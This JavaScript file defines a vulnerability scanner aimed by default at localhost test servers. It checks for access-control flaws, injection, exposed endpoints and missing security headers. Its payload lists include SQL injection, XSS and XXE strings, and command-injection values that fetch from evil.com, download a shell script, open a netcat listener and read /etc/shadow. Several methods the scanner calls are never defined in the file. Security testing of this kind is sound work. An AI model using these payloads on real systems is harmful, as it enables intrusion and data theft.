/**
 * Vulnerability Assessment Framework
 * Automated vulnerability scanning and penetration testing
 */

const axios = require('axios');
const crypto = require('crypto');
const fs = require('fs').promises;
const path = require('path');

class VulnerabilityAssessment {
  constructor(config = {}) {
    this.config = {
      baseUrl: process.env.TEST_BASE_URL || 'http://localhost:3000',
      apiUrl: process.env.TEST_API_URL || 'http://localhost:8000',
      
      // Vulnerability scanning configuration
      maxConcurrentScans: 5,
      requestTimeout: 10000,
      maxRedirects: 3,
      
      // OWASP Top 10 categories
      owaspCategories: [
        'A01_2021-Broken_Access_Control',
        'A02_2021-Cryptographic_Failures',
        'A03_2021-Injection',
        'A04_2021-Insecure_Design',
        'A05_2021-Security_Misconfiguration',
        'A06_2021-Vulnerable_Components',
        'A07_2021-Identification_Authentication_Failures',
        'A08_2021-Software_Data_Integrity_Failures',
        'A09_2021-Security_Logging_Monitoring_Failures',
        'A10_2021-Server_Side_Request_Forgery'
      ],
      
      ...config
    };
    
    this.vulnerabilities = [];
    this.scanResults = {
      informational: [],
      low: [],
      medium: [],
      high: [],
      critical: []
    };
    
    this.payloadDatabase = this.initializePayloads();
  }

  initializePayloads() {
    return {
      sqlInjection: [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM information_schema.tables --",
        "' AND (SELECT COUNT(*) FROM users) > 0 --",
        "admin'--",
        "admin' /*",
        "' OR 1=1#",
        "' OR 'x'='x",
        "1' AND '1'='1",
        "1' OR '1'='1' --"
      ],
      
      xss: [
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(`XSS`)">',
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '<select onfocus=alert("XSS") autofocus>',
        '<textarea onfocus=alert("XSS") autofocus>'
      ],
      
      commandInjection: [
        '; ls -la',
        '| whoami',
        '&& cat /etc/passwd',
        '; cat /etc/shadow',
        '`id`',
        '$(whoami)',
        '; ping -c 4 127.0.0.1',
        '| nc -l 4444',
        '; curl http://evil.com',
        '&& wget http://malicious.com/shell.sh'
      ],
      
      pathTraversal: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '/var/www/../../etc/passwd',
        'file:///etc/passwd',
        '\\..\\..\\..\\etc\\passwd'
      ],
      
      ldapInjection: [
        '*)(uid=*',
        '*)(|(password=*))',
        '*)(&(password=*))',
        '*))%00',
        '*()|%26',
        '*)(objectClass=*',
        '*)(cn=*)',
        '*)(mail=*@*'
      ],
      
      xxe: [
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM \'file:///c:/boot.ini\'>]><root>&test;</root>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]><foo></foo>'
      ]
    };
  }

  // OWASP Top 10 Vulnerability Tests
  async scanOWASPTop10() {
    console.log('üîç Scanning for OWASP Top 10 Vulnerabilities...');
    
    const scanResults = {};
    
    for (const category of this.config.owaspCategories) {
      console.log(`Scanning for ${category}...`);
      
      try {
        const result = await this.scanOWASPCategory(category);
        scanResults[category] = result;
      } catch (error) {
        scanResults[category] = {
          error: error.message,
          vulnerabilities: []
        };
      }
    }
    
    return scanResults;
  }

  async scanOWASPCategory(category) {
    switch (category) {
      case 'A01_2021-Broken_Access_Control':
        return await this.scanBrokenAccessControl();
      case 'A02_2021-Cryptographic_Failures':
        return await this.scanCryptographicFailures();
      case 'A03_2021-Injection':
        return await this.scanInjectionVulnerabilities();
      case 'A04_2021-Insecure_Design':
        return await this.scanInsecureDesign();
      case 'A05_2021-Security_Misconfiguration':
        return await this.scanSecurityMisconfiguration();
      case 'A06_2021-Vulnerable_Components':
        return await this.scanVulnerableComponents();
      case 'A07_2021-Identification_Authentication_Failures':
        return await this.scanAuthenticationFailures();
      case 'A08_2021-Software_Data_Integrity_Failures':
        return await this.scanDataIntegrityFailures();
      case 'A09_2021-Security_Logging_Monitoring_Failures':
        return await this.scanLoggingMonitoringFailures();
      case 'A10_2021-Server_Side_Request_Forgery':
        return await this.scanSSRFVulnerabilities();
      default:
        return { vulnerabilities: [] };
    }
  }

  async scanBrokenAccessControl() {
    const vulnerabilities = [];
    
    // Test for horizontal privilege escalation
    const testUsers = await this.createMultipleTestUsers(2);
    
    try {
      // User 1 tries to access User 2's data
      const response = await axios.get(`${this.config.apiUrl}/api/user/${testUsers[1].id}/profile`, {
        headers: { 'Authorization': `Bearer ${testUsers[0].token}` }
      });
      
      if (response.status === 200) {
        vulnerabilities.push({
          type: 'Horizontal Privilege Escalation',
          severity: 'HIGH',
          description: 'User can access another user\'s profile data',
          endpoint: `/api/user/${testUsers[1].id}/profile`,
          evidence: 'Unauthorized access to user profile succeeded'
        });
      }
    } catch (error) {
      // Expected behavior - access should be denied
    }
    
    // Test for vertical privilege escalation
    try {
      const adminResponse = await axios.get(`${this.config.apiUrl}/api/admin/users`, {
        headers: { 'Authorization': `Bearer ${testUsers[0].token}` }
      });
      
      if (adminResponse.status === 200) {
        vulnerabilities.push({
          type: 'Vertical Privilege Escalation',
          severity: 'CRITICAL',
          description: 'Regular user can access admin endpoints',
          endpoint: '/api/admin/users',
          evidence: 'Unauthorized admin access succeeded'
        });
      }
    } catch (error) {
      // Expected behavior - access should be denied
    }
    
    // Test for direct object references
    const objectIds = ['1', '2', '100', '999', 'admin', '../admin'];
    
    for (const id of objectIds) {
      try {
        const response = await axios.get(`${this.config.apiUrl}/api/meetings/${id}`, {
          headers: { 'Authorization': `Bearer ${testUsers[0].token}` }
        });
        
        if (response.status === 200 && response.data.id !== testUsers[0].id) {
          vulnerabilities.push({
            type: 'Insecure Direct Object Reference',
            severity: 'MEDIUM',
            description: `User can access meeting ${id} without proper authorization`,
            endpoint: `/api/meetings/${id}`,
            evidence: 'Direct object reference succeeded'
          });
        }
      } catch (error) {
        // Expected behavior for unauthorized access
      }
    }
    
    return { vulnerabilities };
  }

  async scanInjectionVulnerabilities() {
    const vulnerabilities = [];
    
    // SQL Injection Tests
    const sqlVulns = await this.testSQLInjection();
    vulnerabilities.push(...sqlVulns);
    
    // XSS Tests
    const xssVulns = await this.testXSSVulnerabilities();
    vulnerabilities.push(...xssVulns);
    
    // Command Injection Tests
    const cmdVulns = await this.testCommandInjection();
    vulnerabilities.push(...cmdVulns);
    
    // LDAP Injection Tests
    const ldapVulns = await this.testLDAPInjection();
    vulnerabilities.push(...ldapVulns);
    
    // XXE Tests
    const xxeVulns = await this.testXXEVulnerabilities();
    vulnerabilities.push(...xxeVulns);
    
    return { vulnerabilities };
  }

  async testSQLInjection() {
    const vulnerabilities = [];
    const endpoints = [
      { path: '/api/auth/login', method: 'POST', params: { email: 'PAYLOAD', password: 'test' } },
      { path: '/api/users/search', method: 'GET', params: { q: 'PAYLOAD' } },
      { path: '/api/meetings', method: 'GET', params: { filter: 'PAYLOAD' } }
    ];
    
    for (const endpoint of endpoints) {
      for (const payload of this.payloadDatabase.sqlInjection) {
        try {
          const testParams = { ...endpoint.params };
          
          // Replace PAYLOAD with actual injection payload
          for (const [key, value] of Object.entries(testParams)) {
            if (value === 'PAYLOAD') {
              testParams[key] = payload;
            }
          }
          
          let response;
          if (endpoint.method === 'GET') {
            response = await axios.get(`${this.config.apiUrl}${endpoint.path}`, {
              params: testParams,
              timeout: this.config.requestTimeout
            });
          } else {
            response = await axios.post(`${this.config.apiUrl}${endpoint.path}`, testParams, {
              timeout: this.config.requestTimeout
            });
          }
          
          // Check for SQL error messages in response
          const responseText = JSON.stringify(response.data).toLowerCase();
          const sqlErrors = [
            'sql syntax',
            'mysql_fetch',
            'ora-01756',
            'microsoft ole db',
            'odbc sql server driver',
            'sqlite_error',
            'postgresql error',
            'warning: mysql'
          ];
          
          const hasSQLError = sqlErrors.some(error => responseText.includes(error));
          
          if (hasSQLError || response.status === 500) {
            vulnerabilities.push({
              type: 'SQL Injection',
              severity: 'HIGH',
              description: 'Potential SQL injection vulnerability detected',
              endpoint: endpoint.path,
              method: endpoint.method,
              payload: payload.substring(0, 50) + '...',
              evidence: hasSQLError ? 'SQL error message in response' : 'Server error response'
            });
          }
          
        } catch (error) {
          // Check if error response contains SQL error messages
          if (error.response?.data) {
            const errorText = JSON.stringify(error.response.data).toLowerCase();
            const hasSQLError = ['sql', 'database', 'mysql', 'postgresql'].some(term => 
              errorText.includes(term)
            );
            
            if (hasSQLError) {
              vulnerabilities.push({
                type: 'SQL Injection',
                severity: 'HIGH',
                description: 'SQL injection vulnerability detected through error messages',
                endpoint: endpoint.path,
                method: endpoint.method,
                payload: payload.substring(0, 50) + '...',
                evidence: 'SQL error in response'
              });
            }
          }
        }
      }
    }
    
    return vulnerabilities;
  }

  async testXSSVulnerabilities() {
    const vulnerabilities = [];
    const endpoints = [
      { path: '/api/user/profile', method: 'PUT', params: { name: 'PAYLOAD', bio: 'PAYLOAD' } },
      { path: '/api/meetings', method: 'POST', params: { title: 'PAYLOAD', description: 'PAYLOAD' } },
      { path: '/api/comments', method: 'POST', params: { content: 'PAYLOAD' } }
    ];
    
    for (const endpoint of endpoints) {
      for (const payload of this.payloadDatabase.xss) {
        try {
          const testParams = { ...endpoint.params };
          
          // Replace PAYLOAD with actual XSS payload
          for (const [key, value] of Object.entries(testParams)) {
            if (value === 'PAYLOAD') {
              testParams[key] = payload;
            }
          }
          
          const response = await axios({
            method: endpoint.method,
            url: `${this.config.apiUrl}${endpoint.path}`,
            data: testParams,
            timeout: this.config.requestTimeout
          });
          
          // Check if payload is reflected in response without encoding
          const responseText = JSON.stringify(response.data);
          const isReflected = responseText.includes(payload);
          
          if (isReflected) {
            vulnerabilities.push({
              type: 'Cross-Site Scripting (XSS)',
              severity: 'MEDIUM',
              description: 'XSS payload reflected in response without proper encoding',
              endpoint: endpoint.path,
              method: endpoint.method,
              payload: payload.substring(0, 50) + '...',
              evidence: 'Payload reflected in response'
            });
          }
          
        } catch (error) {
          // XSS might cause parsing errors
          if (error.response?.data && typeof error.response.data === 'string') {
            const isReflected = error.response.data.includes(payload);
            
            if (isReflected) {
              vulnerabilities.push({
                type: 'Cross-Site Scripting (XSS)',
                severity: 'MEDIUM',
                description: 'XSS payload reflected in error response',
                endpoint: endpoint.path,
                method: endpoint.method,
                payload: payload.substring(0, 50) + '...',
                evidence: 'Payload reflected in error response'
              });
            }
          }
        }
      }
    }
    
    return vulnerabilities;
  }

  async scanSecurityMisconfiguration() {
    const vulnerabilities = [];
    
    // Test for exposed sensitive endpoints
    const sensitiveEndpoints = [
      '/admin',
      '/api/admin',
      '/debug',
      '/test',
      '/config',
      '/env',
      '/.env',
      '/phpinfo.php',
      '/server-info',
      '/server-status',
      '/actuator/health',
      '/metrics',
      '/health'
    ];
    
    for (const endpoint of sensitiveEndpoints) {
      try {
        const response = await axios.get(`${this.config.apiUrl}${endpoint}`, {
          timeout: this.config.requestTimeout
        });
        
        if (response.status === 200) {
          vulnerabilities.push({
            type: 'Exposed Sensitive Endpoint',
            severity: 'MEDIUM',
            description: `Sensitive endpoint ${endpoint} is publicly accessible`,
            endpoint,
            evidence: `HTTP ${response.status} response received`
          });
        }
      } catch (error) {
        // Expected behavior - endpoints should not be accessible
      }
    }
    
    // Test for security headers
    try {
      const response = await axios.get(this.config.baseUrl);
      const headers = response.headers;
      
      const securityHeaders = {
        'x-frame-options': 'X-Frame-Options header missing',
        'x-content-type-options': 'X-Content-Type-Options header missing',
        'x-xss-protection': 'X-XSS-Protection header missing',
        'strict-transport-security': 'HSTS header missing',
        'content-security-policy': 'CSP header missing',
        'referrer-policy': 'Referrer-Policy header missing'
      };
      
      for (const [header, description] of Object.entries(securityHeaders)) {
        if (!headers[header]) {
          vulnerabilities.push({
            type: 'Missing Security Header',
            severity: 'LOW',
            description,
            endpoint: '/',
            evidence: `${header} header not present in response`
          });
        }
      }
    } catch (error) {
      // Could not test security headers
    }
    
    return { vulnerabilities };
  }

  // Utility methods
  async createMultipleTestUsers(count) {
    const users = [];
    
    for (let i = 0; i < count; i++) {
      const email = `vuln-test-${Date.now()}-${i}@example.com`;
      
      try {
        const response = await axios.post(`${this.config.apiUrl}/api/auth/register`, {
          email,
          password: 'TestPassword123!',
          name: `Vuln Test User ${i + 1}`
        });
        
        users.push({
          email,
          token: response.data.token,
          id: response.data.user?.id || `user-${i + 1}`
        });
      } catch (error) {
        console.warn(`Failed to create test user ${i + 1}:`, error.message);
      }
    }
    
    return users;
  }

  // Comprehensive vulnerability assessment
  async runComprehensiveAssessment() {
    console.log('üîç Starting Comprehensive Vulnerability Assessment...');
    
    const startTime = Date.now();
    
    try {
      // Run OWASP Top 10 scans
      const owaspResults = await this.scanOWASPTop10();
      
      // Categorize vulnerabilities by severity
      this.categorizeVulnerabilities(owaspResults);
      
      // Generate assessment report
      const report = this.generateAssessmentReport(owaspResults);
      
      return {
        timestamp: new Date().toISOString(),
        duration: Date.now() - startTime,
        ...report
      };
      
    } catch (error) {
      console.error('Vulnerability assessment failed:', error);
      throw error;
    }
  }

  categorizeVulnerabilities(owaspResults) {
    for (const [category, result] of Object.entries(owaspResults)) {
      if (result.vulnerabilities) {
        for (const vuln of result.vulnerabilities) {
          const severity = vuln.severity.toLowerCase();
          if (this.scanResults[severity]) {
            this.scanResults[severity].push({
              ...vuln,
              category
            });
          }
        }
      }
    }
  }

  generateAssessmentReport(owaspResults) {
    const totalVulnerabilities = Object.values(this.scanResults).reduce((sum, vulns) => sum + vulns.length, 0);
    
    // Calculate risk score
    const riskScore = this.calculateRiskScore();
    
    return {
      summary: {
        totalVulnerabilities,
        critical: this.scanResults.critical.length,
        high: this.scanResults.high.length,
        medium: this.scanResults.medium.length,
        low: this.scanResults.low.length,
        informational: this.scanResults.informational.length,
        riskScore,
        riskLevel: this.getRiskLevel(riskScore)
      },
      vulnerabilities: this.scanResults,
      owaspResults,
      recommendations: this.generateSecurityRecommendations()
    };
  }

  calculateRiskScore() {
    const weights = { critical: 10, high: 7, medium: 4, low: 2, informational: 1 };
    let score = 0;
    
    for (const [severity, vulns] of Object.entries(this.scanResults)) {
      score += vulns.length * (weights[severity] || 0);
    }
    
    return Math.min(score, 100); // Cap at 100
  }

  getRiskLevel(score) {
    if (score >= 80) return 'CRITICAL';
    if (score >= 60) return 'HIGH';
    if (score >= 40) return 'MEDIUM';
    if (score >= 20) return 'LOW';
    return 'MINIMAL';
  }

  generateSecurityRecommendations() {
    const recommendations = [];
    
    if (this.scanResults.critical.length > 0) {
      recommendations.push({
        priority: 'CRITICAL',
        title: 'Address Critical Vulnerabilities Immediately',
        description: `${this.scanResults.critical.length} critical vulnerabilities found that require immediate attention`,
        actions: [
          'Review and fix all critical vulnerabilities',
          'Implement emergency security patches',
          'Consider taking affected systems offline if necessary'
        ]
      });
    }
    
    if (this.scanResults.high.length > 0) {
      recommendations.push({
        priority: 'HIGH',
        title: 'Fix High-Risk Vulnerabilities',
        description: `${this.scanResults.high.length} high-risk vulnerabilities that should be addressed quickly`,
        actions: [
          'Prioritize high-risk vulnerability fixes',
          'Implement additional security controls',
          'Review security architecture'
        ]
      });
    }
    
    // Add specific recommendations based on vulnerability types
    const vulnTypes = new Set();
    Object.values(this.scanResults).flat().forEach(vuln => vulnTypes.add(vuln.type));
    
    if (vulnTypes.has('SQL Injection')) {
      recommendations.push({
        priority: 'HIGH',
        title: 'Implement SQL Injection Prevention',
        description: 'SQL injection vulnerabilities detected',
        actions: [
          'Use parameterized queries/prepared statements',
          'Implement input validation and sanitization',
          'Apply principle of least privilege to database accounts'
        ]
      });
    }
    
    if (vulnTypes.has('Cross-Site Scripting (XSS)')) {
      recommendations.push({
        priority: 'MEDIUM',
        title: 'Implement XSS Prevention',
        description: 'Cross-site scripting vulnerabilities detected',
        actions: [
          'Implement output encoding/escaping',
          'Use Content Security Policy (CSP)',
          'Validate and sanitize all user inputs'
        ]
      });
    }
    
    return recommendations;
  }
}

module.exports = VulnerabilityAssessment;